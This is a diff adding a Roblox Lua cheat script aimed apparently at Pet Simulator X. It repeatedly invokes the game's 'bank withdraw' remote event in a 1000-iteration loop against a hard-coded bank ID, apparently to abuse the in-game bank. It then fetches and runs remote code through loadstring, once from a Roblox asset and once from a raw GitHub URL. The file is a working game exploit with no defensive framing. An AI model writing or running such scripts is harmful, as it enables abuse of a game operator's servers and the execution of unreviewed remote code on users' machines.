@@ -1,0 +1,29 @@
+workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "bank withdraw")
+local function Bank(id)
+   local self = {}
+   function self:withdraw(pets, gems)
+local A_1 = 
+{
+    [1] = id, 
+    [2] = 
+{
+}, 
+    [3] = gems
+}
+        local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["bank withdraw"]
+        Event:InvokeServer(A_1)
+   end
+   return self
+end
+--//
+local bankid = "12589f29-a832-417a-8eda-626190479d97"--bank
+for i=1, 1000 do
+   Bank(bankid):withdraw({}, 1)
+   print('withdrawed 1 gem')
+   Bank(bankid):withdraw({}, 1)
+   print('withdrawed 1 gem')
+   task.wait()
+end
+
+loadstring(game:GetObjects("rbxassetid://8194485654")[1].Source)("Petsi-X")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BLACKGAMER1221/Pet-Simulator-X/main/BK%20Pet.lua"))()
